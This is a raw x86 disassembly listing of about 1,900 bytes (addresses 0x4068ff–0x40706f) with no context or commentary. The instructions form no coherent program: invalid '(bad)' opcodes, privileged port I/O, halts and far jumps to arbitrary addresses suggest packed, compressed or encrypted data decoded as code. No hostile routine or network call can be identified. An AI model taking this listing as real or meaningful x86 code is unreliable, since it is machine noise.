  4068ff:	outs   dx,BYTE PTR ds:[esi]
  406900:	leave  
  406901:	and    DWORD PTR [edi],edi
  406903:	js     0x406898
  406905:	cmc    
  406906:	xchg   edi,eax
  406907:	dec    edx
  406908:	call   0x2b2b5882
  40690d:	int3   
  40690e:	addr16 ja 0x4068c2
  406911:	xor    BYTE PTR [edx],dh
  406913:	cmp    eax,0xab0ee5ed
  406918:	stos   DWORD PTR es:[edi],eax
  406919:	sub    eax,0xaf751852
  40691e:	popa   
  40691f:	shr    BYTE PTR [edi+0x6],1
  406922:	mov    ch,0x7a
  406924:	push   0x7a89eff2
  406929:	lea    edx,[eax+esi*2]
  40692c:	add    eax,0xfdd229eb
  406931:	ret    
  406932:	mov    bl,0xde
  406934:	fdivr  QWORD PTR [ebp-0x6b]
  406937:	rcl    bh,cl
  406939:	cmc    
  40693a:	popa   
  40693b:	dec    ebx
  40693c:	sub    eax,0xf430cd5
  406941:	shl    DWORD PTR ds:0x2d6715f6,1
  406947:	cdq    
  406948:	push   cs
  406949:	or     ecx,DWORD PTR [ecx+0x32fe21b3]
  40694f:	scas   eax,DWORD PTR es:[edi]
  406950:	jp     0x4069ad
  406952:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406953:	(bad)  ss:[ebx+0x14]
  406957:	out    0x9c,eax
  406959:	and    BYTE PTR [eax],0x81
  40695c:	jae    0x406952
  40695e:	ror    DWORD PTR ds:0x7d942f51,cl
  406964:	jb     0x4069e5
  406966:	mov    DWORD PTR [eax+0x15e60e56],edi
  40696c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40696d:	and    ebx,DWORD PTR [edi-0x1a]
  406970:	jne    0x406921
  406972:	stos   BYTE PTR es:[edi],al
  406973:	pop    ebp
  406974:	bound  edi,QWORD PTR [edi]
  406976:	pop    ebx
  406977:	retf   
  406978:	push   0x42
  40697a:	adc    eax,0xef2bbec6
  40697f:	mov    bl,0x5c
  406981:	int    0xd5
  406983:	jmp    0x1b53:0x5f5d1e80
  40698a:	imul   esi,DWORD PTR [ebx],0x2b
  40698d:	dec    ebp
  40698e:	or     DWORD PTR [eax+edx*1-0x39],edx
  406992:	pop    ecx
  406993:	jb     0x406936
  406995:	in     al,0x6f
  406997:	shl    edx,1
  406999:	mov    ds:0x873df0aa,eax
  40699e:	xor    edx,DWORD PTR [ecx+0x43]
  4069a1:	loope  0x406a13
  4069a3:	mov    al,0xff
  4069a5:	outs   dx,DWORD PTR ds:[esi]
  4069a6:	adc    BYTE PTR [esi],bh
  4069a8:	xor    cl,BYTE PTR [ebx+0x5d13f77]
  4069ae:	lods   eax,DWORD PTR ds:[esi]
  4069af:	or     al,BYTE PTR [ecx-0x41]
  4069b2:	mov    ch,0x2e
  4069b4:	loope  0x406992
  4069b6:	imul   ecx,DWORD PTR [esi],0x51b73034
  4069bc:	repnz daa 
  4069be:	icebp  
  4069bf:	stos   BYTE PTR es:[edi],al
  4069c0:	mov    al,0x2d
  4069c2:	lods   eax,DWORD PTR ds:[esi]
  4069c3:	jb     0x4069b6
  4069c5:	xor    BYTE PTR [edx],cl
  4069c7:	lds    ebp,FWORD PTR es:[edi-0x3a]
  4069cb:	cmp    al,0x5
  4069cd:	push   esi
  4069ce:	xchg   esp,eax
  4069cf:	jne    0x4069b8
  4069d1:	pushf  
  4069d2:	cs ret 0x6d66
  4069d6:	out    0xaf,al
  4069d8:	cdq    
  4069d9:	out    0x33,al
  4069db:	out    dx,eax
  4069dc:	pushf  
  4069dd:	ja     0x40698d
  4069df:	jl     0x406a14
  4069e1:	mov    dh,0x17
  4069e3:	or     eax,0x206913b
  4069e8:	jmp    0xae0b548
  4069ed:	lahf   
  4069ee:	xor    eax,0x868f13af
  4069f3:	mov    ebp,0x97d620c1
  4069f8:	popf   
  4069f9:	mov    eax,0xc60c5240
  4069fe:	cmp    al,0x34
  406a00:	mov    ah,0xc6
  406a02:	push   0x7a66a217
  406a07:	hlt    
  406a08:	inc    esi
  406a09:	out    dx,eax
  406a0a:	fmul   DWORD PTR [edi-0x786a0f9d]
  406a10:	pop    es
  406a11:	fidivr WORD PTR [esi+0x54]
  406a14:	xchg   BYTE PTR [edi-0x3c],al
  406a17:	(bad)  
  406a18:	cmp    dh,BYTE PTR [ecx-0x68]
  406a1b:	ficomp DWORD PTR ds:0xea6d9836
  406a21:	imul   ebp,DWORD PTR [ebp-0x2],0xffffffdb
  406a25:	push   cs
  406a26:	mov    ecx,0x85c8b769
  406a2b:	popa   
  406a2c:	dec    edx
  406a2d:	sbb    BYTE PTR [ebx-0x36],dl
  406a30:	jp     0x4069d3
  406a32:	push   edi
  406a33:	out    0x5a,eax
  406a35:	sub    edx,DWORD PTR [edx-0x25]
  406a38:	adc    DWORD PTR [ebx+0x54],ebp
  406a3b:	(bad)  
  406a3c:	stos   BYTE PTR es:[edi],al
  406a3d:	mov    ebx,0x6bc985d0
  406a42:	out    0xfd,eax
  406a44:	add    bl,bl
  406a46:	(bad)  [ecx-0x53]
  406a49:	sub    esp,ebp
  406a4b:	pop    ss
  406a4c:	xchg   edi,eax
  406a4d:	inc    ebp
  406a4e:	cmp    edx,ecx
  406a50:	fisubr DWORD PTR [edi+0x64]
  406a53:	or     ecx,DWORD PTR [ebx+ebp*2+0x60]
  406a57:	add    eax,0x115aca8a
  406a5c:	pop    esp
  406a5d:	cs clc 
  406a5f:	mov    ds:0xf492ed93,eax
  406a64:	not    BYTE PTR [ecx+0x7f]
  406a67:	dec    esi
  406a68:	iret   
  406a69:	or     eax,0xbfb86e9c
  406a6e:	rol    BYTE PTR [ebx+0xd],cl
  406a71:	scas   eax,DWORD PTR es:[edi]
  406a72:	ret    0x411c
  406a75:	jbe    0x406ae9
  406a77:	xor    DWORD PTR [esi],ebx
  406a79:	dec    ecx
  406a7a:	and    al,BYTE PTR [ecx-0xb]
  406a7d:	cmp    edx,DWORD PTR [ebx-0x12]
  406a80:	jnp    0x406aae
  406a82:	push   ds
  406a83:	push   cs
  406a84:	shr    dh,0x88
  406a87:	ret    
  406a88:	cmp    al,0xd7
  406a8a:	mov    ebp,0x8f9babb9
  406a8f:	ds dec edx
  406a91:	dec    ebx
  406a92:	out    dx,eax
  406a93:	pop    es
  406a94:	mov    dh,0x8d
  406a96:	push   es
  406a97:	retf   0xcbfc
  406a9a:	mov    DWORD PTR [eax+edi*1],edx
  406a9d:	add    BYTE PTR [edx-0x1195805a],bh
  406aa3:	xlat   BYTE PTR ds:[ebx]
  406aa4:	jb     0x406aaa
  406aa6:	xchg   ecx,eax
  406aa7:	dec    esp
  406aa8:	fdivr  QWORD PTR [edi+0x5e]
  406aab:	pop    edx
  406aac:	nop
  406aad:	and    edi,DWORD PTR [ebp+eax*2-0x49]
  406ab1:	mov    ds:0xe748d1ea,al
  406ab6:	(bad)  
  406ab7:	adc    al,BYTE PTR [ebx+ebp*2]
  406aba:	jns    0x406ac3
  406abc:	dec    edx
  406abd:	outs   dx,BYTE PTR ds:[esi]
  406abe:	inc    ebx
  406abf:	adc    DWORD PTR [ebx+eiz*8+0x7d],ebx
  406ac3:	mov    dl,0xcc
  406ac5:	add    eax,0xb184c8e3
  406aca:	jmp    0x20f56de5
  406acf:	in     eax,dx
  406ad0:	cli    
  406ad1:	mov    bh,0x9c
  406ad3:	out    dx,al
  406ad4:	inc    ebp
  406ad5:	enter  0xb29e,0xff
  406ad9:	popa   
  406ada:	mov    BYTE PTR [edx-0x663b2761],ah
  406ae0:	cmp    edx,ebp
  406ae2:	jmp    0x7946:0x1f8e194e
  406ae9:	arpl   WORD PTR [ecx],sp
  406aeb:	loope  0x406b6b
  406aed:	mov    ebx,0xa2e89990
  406af2:	pop    ds
  406af3:	xor    BYTE PTR [ebx+0x14473e52],ah
  406af9:	push   0x98653179
  406afe:	ss inc esi
  406b00:	sbb    bl,al
  406b02:	call   0x5617452a
  406b07:	inc    edi
  406b08:	push   edx
  406b09:	repnz adc eax,DWORD PTR [esi+0x59]
  406b0d:	out    0x5b,al
  406b0f:	(bad)  
  406b10:	retf   0x3ef3
  406b13:	xlat   BYTE PTR ds:[ebx]
  406b14:	xor    BYTE PTR [ebp+0x2c],cl
  406b17:	fist   DWORD PTR [edi-0x52da508c]
  406b1d:	dec    edx
  406b1e:	mov    ebp,0x5f14a580
  406b23:	push   edx
  406b24:	popa   
  406b25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b26:	(bad)  [esi+eax*1]
  406b29:	cmp    edi,DWORD PTR ds:0x9bf29544
  406b2f:	inc    edi
  406b30:	inc    ebp
  406b31:	ins    BYTE PTR es:[edi],dx
  406b32:	and    cl,bh
  406b34:	(bad)  
  406b35:	fbld   TBYTE PTR [ecx-0x15da92d8]
  406b3b:	cli    
  406b3c:	ins    BYTE PTR es:[edi],dx
  406b3d:	cmp    dh,BYTE PTR [esp+esi*2-0x48]
  406b41:	push   cs
  406b42:	sbb    edi,ecx
  406b44:	add    DWORD PTR [edx-0x65],esp
  406b47:	and    edi,DWORD PTR [edi]
  406b49:	sbb    al,0xb3
  406b4b:	pop    esi
  406b4c:	pushf  
  406b4d:	popa   
  406b4e:	jb     0x406bc0
  406b50:	mov    dh,0x34
  406b52:	lea    edi,[ebp-0x80]
  406b55:	inc    ebx
  406b56:	int    0x3e
  406b58:	hlt    
  406b59:	ret    
  406b5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b5b:	dec    ecx
  406b5c:	clc    
  406b5d:	(bad)  
  406b5e:	xchg   edx,eax
  406b5f:	imul   eax,DWORD PTR [ebp+edx*8+0x61],0x5b7be378
  406b67:	cmp    al,0x85
  406b69:	xchg   esi,eax
  406b6a:	sub    eax,0x7abe0d7b
  406b6f:	push   ds
  406b70:	mov    bh,0x45
  406b72:	add    cl,0x18
  406b75:	fild   QWORD PTR ds:0x62a5e3be
  406b7b:	and    BYTE PTR [ebx-0x184ace87],ah
  406b81:	add    eax,DWORD PTR [edx+0x29c10fa6]
  406b87:	idiv   DWORD PTR [edx-0x46]
  406b8a:	(bad)  
  406b8b:	cmp    ebx,DWORD PTR [edi]
  406b8d:	jnp    0x406bc6
  406b8f:	aad    0x2f
  406b91:	(bad)  
  406b93:	iret   
  406b94:	loopne 0x406b8a
  406b96:	mov    DWORD PTR [edi+0x46cca09b],ebx
  406b9c:	leave  
  406b9d:	aas    
  406b9e:	mov    dh,0xe0
  406ba0:	add    ecx,eax
  406ba2:	cmp    dl,BYTE PTR [ebx*2+0x77c2914]
  406ba9:	aam    0x1f
  406bab:	addr16 dec ecx
  406bad:	xor    eax,0x1cef06b5
  406bb2:	(bad)  [eax+0x18]
  406bb5:	and    BYTE PTR [eax],bh
  406bb7:	lds    ebx,FWORD PTR [ecx-0x66]
  406bba:	ja     0x406b5f
  406bbc:	pushf  
  406bbd:	out    0xa7,eax
  406bbf:	mov    edi,0x68f89522
  406bc4:	pop    esi
  406bc5:	push   cs
  406bc6:	push   0xffffffee
  406bc8:	in     al,dx
  406bc9:	pop    ecx
  406bca:	adc    eax,0xc36f8b8b
  406bcf:	ins    DWORD PTR es:[edi],dx
  406bd0:	sahf   
  406bd1:	xor    ch,ah
  406bd3:	push   ss
  406bd4:	aaa    
  406bd5:	push   eax
  406bd6:	frstor [ecx-0x48]
  406bd9:	xchg   ebx,eax
  406bda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bdb:	mov    dh,0xd1
  406bdd:	outs   dx,BYTE PTR ds:[esi]
  406bde:	popf   
  406bdf:	cdq    
  406be0:	(bad)  [esi+0x63448902]
  406be6:	aas    
  406be7:	inc    esp
  406be8:	pop    es
  406be9:	cmp    eax,0xa06c6fc1
  406bee:	jmp    0xd09f9de8
  406bf3:	inc    eax
  406bf4:	in     al,0xf0
  406bf6:	dec    ecx
  406bf7:	pop    ds
  406bf8:	mov    ds:0xc381643c,al
  406bfd:	jp     0x406c04
  406bff:	push   0x1b
  406c01:	div    BYTE PTR [eax-0x56]
  406c04:	sub    ch,dh
  406c06:	(bad)  
  406c07:	scas   al,BYTE PTR es:[edi]
  406c08:	ret    0x4956
  406c0b:	neg    BYTE PTR [ebp+0x7fe294f6]
  406c11:	or     al,0x5d
  406c13:	add    BYTE PTR [edi+0xa],ah
  406c16:	scas   eax,DWORD PTR es:[edi]
  406c17:	ror    DWORD PTR [ebp+0x2a9462a2],0x87
  406c1e:	ror    BYTE PTR [ecx+ecx*2],cl
  406c21:	mov    ebx,0x43405dc4
  406c26:	jne    0x406bc0
  406c28:	inc    ebx
  406c29:	stos   DWORD PTR es:[edi],eax
  406c2a:	aam    0xe
  406c2c:	dec    edx
  406c2d:	es mov dl,BYTE PTR ss:[edx]
  406c31:	out    dx,eax
  406c32:	jg     0x406c22
  406c34:	pop    ds
  406c35:	je     0x406caf
  406c37:	stos   DWORD PTR es:[edi],eax
  406c38:	push   ss
  406c39:	(bad)  [ebp-0x72]
  406c3c:	cdq    
  406c3d:	cmp    DWORD PTR ds:[ebp-0x281afd84],edi
  406c44:	xlat   BYTE PTR ds:[ebx]
  406c45:	inc    ebp
  406c46:	cmp    DWORD PTR ds:[edx],0xffffffee
  406c4a:	mov    ch,0x1c
  406c4c:	imul   esp,DWORD PTR [esi],0x6201fa21
  406c52:	fbld   TBYTE PTR [ebx+0x47ff1bfa]
  406c58:	pop    ebp
  406c59:	pop    ecx
  406c5a:	hlt    
  406c5b:	fimul  WORD PTR [ebx+0x4f608d1b]
  406c62:	mov    eax,ds:0x43201a02
  406c67:	inc    BYTE PTR [eax]
  406c69:	ins    DWORD PTR es:[edi],dx
  406c6a:	mov    edi,?
  406c6c:	sbb    DWORD PTR ds:0x15fae5fd,0xfd5e3f1
  406c76:	pop    ss
  406c77:	test   al,0x40
  406c79:	xchg   ebx,eax
  406c7a:	cmc    
  406c7b:	mov    esp,0xf686061d
  406c80:	xor    eax,0x75ce4372
  406c85:	push   0x31
  406c87:	jmp    0x408497c8
  406c8c:	mov    bl,0xb6
  406c8e:	mov    edi,0xec6257c9
  406c93:	xchg   edx,eax
  406c94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c95:	xlat   BYTE PTR ds:[ebx]
  406c96:	cmp    eax,0x47ae7153
  406c9b:	cwde   
  406c9c:	(bad)  
  406c9d:	jae    0x406cfb
  406c9f:	out    0x5e,al
  406ca1:	xor    DWORD PTR [esi+edi*8-0x4ff8f97a],esp
  406ca8:	(bad)  
  406ca9:	(bad)  
  406caa:	push   esp
  406cab:	int    0x30
  406cad:	adc    eax,ecx
  406caf:	das    
  406cb0:	bound  esi,QWORD PTR [ebx-0x3a]
  406cb3:	ja     0x406c76
  406cb5:	lea    ebx,[eax]
  406cb7:	lods   eax,DWORD PTR ds:[esi]
  406cb8:	aam    0x66
  406cba:	loopne 0x406d19
  406cbc:	sub    eax,0x3fe76b93
  406cc2:	mov    ebx,0x2f762cad
  406cc7:	aad    0x63
  406cc9:	mov    ah,0xb4
  406ccb:	std    
  406ccc:	cmp    BYTE PTR [ebp-0x77],al
  406ccf:	test   ah,bl
  406cd1:	iret   
  406cd2:	js     0x406d3d
  406cd4:	mov    ds:0x74bc6e0c,al
  406cd9:	(bad)  
  406cda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cdb:	add    DWORD PTR [eax],eax
  406cdd:	bound  edi,QWORD PTR [ecx+0x4f]
  406ce0:	stos   DWORD PTR es:[edi],eax
  406ce1:	ret    0xed46
  406ce4:	sbb    BYTE PTR [edx+0x59],bh
  406ce7:	xchg   edi,eax
  406ce8:	call   0x5a942d1e
  406ced:	sub    bl,BYTE PTR [ebp-0x5105642e]
  406cf3:	push   0x9816bdc1
  406cf8:	(bad)  
  406cf9:	das    
  406cfa:	sbb    eax,0x3d01fbd4
  406cff:	pop    esi
  406d00:	jo     0x406d14
  406d02:	inc    edx
  406d03:	cmp    ah,BYTE PTR [ebx+0x71]
  406d06:	fwait
  406d07:	dec    edx
  406d08:	cwde   
  406d09:	or     al,0x41
  406d0b:	dec    edx
  406d0c:	iret   
  406d0d:	imul   edi,DWORD PTR ds:0xa30d9d58,0xffffffd1
  406d14:	push   ds
  406d15:	xchg   esi,ecx
  406d17:	int3   
  406d18:	cld    
  406d19:	stos   BYTE PTR es:[edi],al
  406d1a:	cmp    edi,DWORD PTR [ecx+0x55]
  406d1d:	pop    ds
  406d1e:	ins    BYTE PTR es:[edi],dx
  406d1f:	call   0xeab6:0x3dd9a823
  406d26:	sbb    ebx,esp
  406d28:	out    dx,al
  406d29:	pop    esp
  406d2a:	xchg   esp,eax
  406d2b:	mov    ch,0xd4
  406d2d:	sub    eax,DWORD PTR [edx-0x71d35bb1]
  406d33:	ror    BYTE PTR [ebx+0x7b],1
  406d36:	jae    0x406da6
  406d38:	adc    al,0x44
  406d3a:	push   esi
  406d3b:	loopne 0x406d7d
  406d3d:	push   ebx
  406d3e:	inc    esp
  406d3f:	popa   
  406d40:	cmp    eax,0xe132d48e
  406d45:	or     BYTE PTR [esi-0x649c95ed],dl
  406d4b:	sbb    dh,BYTE PTR [edx+0x5f]
  406d4e:	jmp    0x406cfe
  406d50:	xorps  xmm5,XMMWORD PTR ds:0xdd80d4f0
  406d57:	sbb    eax,0x1add498e
  406d5c:	inc    ecx
  406d5d:	(bad)  
  406d5e:	scas   eax,DWORD PTR es:[edi]
  406d5f:	outs   dx,BYTE PTR ds:[esi]
  406d60:	std    
  406d61:	xchg   esp,eax
  406d62:	popf   
  406d63:	mov    ds:0x3a3b4bcc,al
  406d68:	mov    esp,DWORD PTR [edi+0x3f]
  406d6b:	in     eax,dx
  406d6c:	ret    
  406d6d:	xchg   ecx,eax
  406d6e:	adc    DWORD PTR [ebx],ecx
  406d70:	jg     0x406ddb
  406d72:	cld    
  406d73:	pop    ebx
  406d74:	das    
  406d75:	iret   
  406d76:	push   ebp
  406d77:	loop   0x406de2
  406d79:	mov    esp,eax
  406d7b:	xchg   DWORD PTR [ebx],edx
  406d7d:	push   ds
  406d7e:	int3   
  406d7f:	jb     0x406d3a
  406d81:	sub    al,0xf
  406d83:	pushf  
  406d84:	inc    esi
  406d85:	inc    edx
  406d86:	cld    
  406d87:	cwde   
  406d88:	call   DWORD PTR [edi]
  406d8a:	adc    eax,0x10c9ba53
  406d8f:	sbb    bl,bl
  406d91:	add    al,0x0
  406d93:	ret    0xb25e
  406d96:	pop    esi
  406d97:	xchg   ecx,eax
  406d98:	stos   DWORD PTR es:[edi],eax
  406d99:	stc    
  406d9a:	mov    dl,0x4d
  406d9c:	test   BYTE PTR [eax+ecx*2],bh
  406d9f:	adc    al,0x4e
  406da1:	mov    esp,0x8065f3d4
  406da6:	(bad)  
  406da7:	jb     0x406d51
  406da9:	push   ds
  406daa:	push   esp
  406dab:	pusha  
  406dac:	dec    esi
  406dad:	inc    ecx
  406dae:	xchg   ebx,eax
  406daf:	call   FWORD PTR [eax+0x7e]
  406db2:	inc    ecx
  406db3:	cmp    esi,esi
  406db5:	bound  edx,QWORD PTR [edi-0x77e09a4b]
  406dbb:	xor    BYTE PTR [ebx-0x63],0x8e
  406dbf:	xor    ecx,DWORD PTR [esi]
  406dc1:	leave  
  406dc2:	and    eax,0x385bb9b6
  406dc7:	inc    ecx
  406dc8:	lds    edx,FWORD PTR [ebx+esi*4]
  406dcb:	xchg   DWORD PTR [ebx],esi
  406dcd:	iret   
  406dce:	and    BYTE PTR [edx+0xc1c707a],bl
  406dd4:	mov    BYTE PTR [ebp+0x11],bl
  406dd7:	leave  
  406dd8:	pop    ecx
  406dd9:	xchg   ecx,eax
  406dda:	sbb    DWORD PTR [esi],ecx
  406ddc:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  406dde:	jo     0x406de5
  406de0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406de1:	int3   
  406de2:	sar    DWORD PTR [eax+0x1930d5dd],1
  406de8:	les    edi,FWORD PTR ds:0x82f3d098
  406dee:	mov    dl,0x5d
  406df0:	clc    
  406df1:	jb     0x406e16
  406df3:	and    al,BYTE PTR [eax]
  406df5:	inc    edx
  406df6:	and    eax,0x25a29d44
  406dfb:	fwait
  406dfc:	mov    cl,BYTE PTR [edx-0x28100d1a]
  406e02:	call   0xd8b98ab7
  406e07:	push   ecx
  406e08:	mov    DWORD PTR [ecx+esi*4],edi
  406e0b:	pop    esp
  406e0c:	pop    ss
  406e0d:	mov    ecx,0x74d033f5
  406e12:	scas   eax,DWORD PTR es:[edi]
  406e13:	xor    ebx,DWORD PTR [ebx-0x7d18d36a]
  406e19:	mov    DWORD PTR [ecx+eiz*8],ebp
  406e1c:	test   ebp,0xb5eb3f03
  406e22:	xor    ebp,DWORD PTR [eax+edx*8]
  406e25:	pop    edx
  406e26:	shl    DWORD PTR [eax],1
  406e28:	cmc    
  406e29:	and    eax,DWORD PTR [eax+0x5dd6ca50]
  406e2f:	movups XMMWORD PTR [eax],xmm0
  406e32:	(bad)  
  406e34:	mov    dl,0xd4
  406e36:	mov    ah,0x77
  406e38:	cwde   
  406e39:	adc    al,ch
  406e3b:	stc    
  406e3c:	frstor [eax]
  406e3e:	dec    edi
  406e3f:	aaa    
  406e40:	mov    eax,ds:0xb9196a21
  406e45:	inc    ecx
  406e46:	add    al,0x2c
  406e48:	popf   
  406e49:	xchg   esp,eax
  406e4a:	not    DWORD PTR [edx+0x63]
  406e4d:	scas   al,BYTE PTR es:[edi]
  406e4e:	lea    edi,[ebp+0x5a]
  406e51:	cld    
  406e52:	jecxz  0x406e3c
  406e54:	pop    eax
  406e55:	into   
  406e56:	mov    edx,0xccccc50f
  406e5b:	cmp    dl,dl
  406e5d:	rol    DWORD PTR [ebp+0x1b],1
  406e60:	aad    0x9e
  406e62:	call   0x6703661c
  406e67:	int    0xe0
  406e69:	aaa    
  406e6a:	cs or  eax,0x3378f844
  406e70:	ds sti 
  406e72:	bound  edi,QWORD PTR [ebx-0x41]
  406e75:	jle    0x406e8e
  406e77:	js     0x406eb4
  406e79:	test   al,0x65
  406e7b:	mov    edi,0xbc8c94b2
  406e80:	mov    cl,0xa2
  406e82:	(bad)  
  406e83:	xor    ecx,esp
  406e85:	popf   
  406e86:	cmp    ebp,ecx
  406e88:	mov    al,0x47
  406e8a:	mov    ds:0x8b05fc26,al
  406e8f:	jnp    0x406eb4
  406e91:	inc    ebp
  406e92:	clc    
  406e93:	add    al,0x71
  406e95:	push   edx
  406e96:	jge    0x406e94
  406e98:	mov    ds:0xf54876a4,eax
  406e9d:	pop    ecx
  406e9e:	adc    esi,DWORD PTR [ecx+0x55]
  406ea1:	jae    0x406e57
  406ea3:	jb     0x406e98
  406ea5:	fcomp  QWORD PTR [eax]
  406ea7:	stos   DWORD PTR es:[edi],eax
  406ea8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ea9:	mov    BYTE PTR [ebx+0x5a4e76fc],dl
  406eaf:	and    DWORD PTR ds:0x6d1627f5,0x1f
  406eb6:	pop    ecx
  406eb7:	adc    DWORD PTR [eax],0x58
  406eba:	xor    al,0x1
  406ebc:	sbb    DWORD PTR [edx],0xffffffb8
  406ebf:	inc    edx
  406ec0:	cmp    BYTE PTR [ecx-0x45bd1cc4],cl
  406ec6:	pop    ecx
  406ec7:	(bad)  
  406ec8:	sub    dl,al
  406eca:	inc    esp
  406ecb:	int    0xb7
  406ecd:	int    0x8c
  406ecf:	or     edx,edi
  406ed1:	dec    ecx
  406ed2:	pusha  
  406ed3:	mov    eax,ds:0x5c1fadeb
  406ed8:	and    BYTE PTR ds:0x7b98e10b,bh
  406ede:	sahf   
  406edf:	xor    esp,DWORD PTR [esi+0x5addac87]
  406ee5:	imul   edi,DWORD PTR [esi],0x51
  406ee8:	mov    ebp,0x6ae11bcc
  406eed:	cmc    
  406eee:	jne    0x406ea2
  406ef0:	hlt    
  406ef1:	shr    BYTE PTR [ebx],1
  406ef3:	cmp    al,0xae
  406ef5:	jl     0x406f6c
  406ef7:	daa    
  406ef8:	push   ds
  406ef9:	add    BYTE PTR ds:0xafcc8b7a,ch
  406eff:	leave  
  406f00:	xor    al,0xb0
  406f02:	add    ebp,DWORD PTR [eax+esi*1+0x79]
  406f06:	std    
  406f07:	cmp    BYTE PTR [eax+0x5ddf12b8],ch
  406f0d:	pop    ecx
  406f0e:	mov    bl,0xa9
  406f10:	push   ebp
  406f11:	push   edi
  406f12:	or     BYTE PTR [edi+0x5308f22e],bh
  406f18:	pop    ebp
  406f19:	add    ch,BYTE PTR [ebp+0x2bc04c6]
  406f1f:	cmp    al,0x8f
  406f21:	add    BYTE PTR [eax],0x8e
  406f24:	outs   dx,BYTE PTR ds:[esi]
  406f25:	icebp  
  406f26:	pop    edi
  406f27:	push   0xffffffb7
  406f29:	lock outs dx,BYTE PTR ds:[esi]
  406f2b:	xchg   esi,eax
  406f2c:	add    DWORD PTR [ebp+esi*4+0xbe09289],0x7f
  406f34:	shl    DWORD PTR [ebp-0x15],cl
  406f37:	mov    al,0x9e
  406f39:	jbe    0x406f8d
  406f3b:	ins    BYTE PTR es:[edi],dx
  406f3c:	hlt    
  406f3d:	jg     0x406f85
  406f3f:	mov    bh,0x1
  406f41:	add    dl,al
  406f43:	loope  0x406f52
  406f45:	aam    0x37
  406f47:	pop    esi
  406f48:	aaa    
  406f49:	imul   eax,DWORD PTR [edx+0x4106c863],0xfebb93a2
  406f53:	aam    0xea
  406f55:	and    ah,BYTE PTR [ecx]
  406f57:	jle    0x406f55
  406f59:	jg     0x406f4b
  406f5b:	enter  0xeb81,0xae
  406f5f:	mov    ch,0x14
  406f61:	data16 into 
  406f63:	push   ebp
  406f64:	pop    esp
  406f65:	and    edx,ecx
  406f67:	inc    edx
  406f68:	pop    ss
  406f69:	xchg   BYTE PTR [edi+0x453c184e],ch
  406f6f:	pushf  
  406f70:	pushf  
  406f71:	mov    ds:0x1b8a34b,eax
  406f76:	std    
  406f77:	clc    
  406f78:	xor    al,BYTE PTR [ebp+0x5e]
  406f7b:	add    al,0x1a
  406f7d:	out    dx,eax
  406f7e:	pushf  
  406f7f:	dec    ebp
  406f80:	shl    BYTE PTR [ebx],0xc8
  406f83:	inc    edx
  406f84:	pop    ebx
  406f85:	imul   esi,ebp,0xdaed5500
  406f8b:	(bad)  
  406f8c:	push   cs
  406f8d:	inc    edi
  406f8e:	je     0x406f24
  406f90:	and    eax,0x344402ec
  406f95:	leave  
  406f96:	add    al,0xe4
  406f98:	jnp    0x406f43
  406f9a:	hlt    
  406f9b:	dec    eax
  406f9c:	adc    al,al
  406f9e:	js     0x406fd2
  406fa0:	xor    al,0xd6
  406fa2:	loope  0x407004
  406fa4:	sbb    BYTE PTR [esi],0xfa
  406fa7:	or     eax,0xe923daa8
  406fac:	aas    
  406fad:	mov    esp,0x7ac6e72f
  406fb2:	jb     0x407018
  406fb4:	js     0x406f84
  406fb6:	sub    al,0x47
  406fb8:	mov    ecx,0xa367b566
  406fbd:	pop    es
  406fbe:	das    
  406fbf:	ret    0x9a1f
  406fc2:	and    esi,edx
  406fc4:	mov    ebx,0x4d6766e7
  406fc9:	loopne 0x406f61
  406fcb:	fist   WORD PTR [eax]
  406fcd:	mov    esp,0xc2b3a448
  406fd2:	not    bh
  406fd4:	js     0x406f81
  406fd6:	adc    ecx,DWORD PTR [eax+ecx*2-0x65f99cd1]
  406fdd:	fwait
  406fde:	sbb    al,0xd8
  406fe0:	ret    
  406fe1:	jle    0x407054
  406fe3:	inc    ebx
  406fe4:	adc    dl,bl
  406fe6:	sub    edx,edx
  406fe8:	scas   al,BYTE PTR es:[edi]
  406fe9:	fs loopne 0x406f6d
  406fec:	mov    ds:0x832d528,al
  406ff1:	push   ds
  406ff2:	add    eax,0xfcfbbf43
  406ff7:	bswap  esp
  406ff9:	mov    al,ds:0x5c78373b
  406ffe:	hlt    
  406fff:	push   edx
  407000:	stc    
  407001:	pop    esi
  407002:	mov    DWORD PTR [edi-0x1c9c2afa],eax
  407008:	sbb    al,BYTE PTR [esi+ecx*8-0x173dcb19]
  40700f:	nop
  407010:	fisubr WORD PTR [edi+0x30]
  407013:	jmp    0x407022
  407015:	(bad)  
  407016:	rcl    BYTE PTR [ecx+0x64],1
  407019:	sbb    eax,0xeae4f25e
  40701e:	popf   
  40701f:	mov    BYTE PTR [edi],dl
  407021:	xchg   ebp,eax
  407022:	std    
  407023:	or     bh,BYTE PTR [ecx-0x69]
  407026:	(bad)  
  407028:	pop    ebx
  407029:	push   cs
  40702a:	retf   
  40702b:	scas   al,BYTE PTR es:[edi]
  40702c:	and    DWORD PTR [ebp-0x722f8179],ebx
  407032:	add    cl,BYTE PTR [edx-0x38a36189]
  407038:	jmp    0x406fd8
  40703a:	adc    al,dh
  40703c:	pop    eax
  40703d:	jno    0x40709a
  40703f:	(bad)  
  407040:	inc    esp
  407041:	jmp    0xa33f:0xc48135b6
  407048:	push   edi
  407049:	push   eax
  40704a:	adc    BYTE PTR [esi],ah
  40704c:	xor    al,0x54
  40704e:	leave  
  40704f:	dec    esp
  407050:	aas    
  407051:	inc    edi
  407052:	outs   dx,BYTE PTR ds:[esi]
  407053:	jne    0x40708e
  407055:	popf   
  407056:	mov    al,0xb
  407058:	and    BYTE PTR [edx],ah
  40705a:	cmp    DWORD PTR [eax],esi
  40705c:	jbe    0x407011
  40705e:	sub    BYTE PTR [edx-0x27],ah
  407061:	jae    0x406ff1
  407063:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407064:	adc    DWORD PTR [edi],0xffffffd6
  407067:	sub    eax,0x7dc15c47
  40706c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40706d:	inc    ecx
  40706e:	scas   eax,DWORD PTR es:[edi]
  40706f:	pop    eax
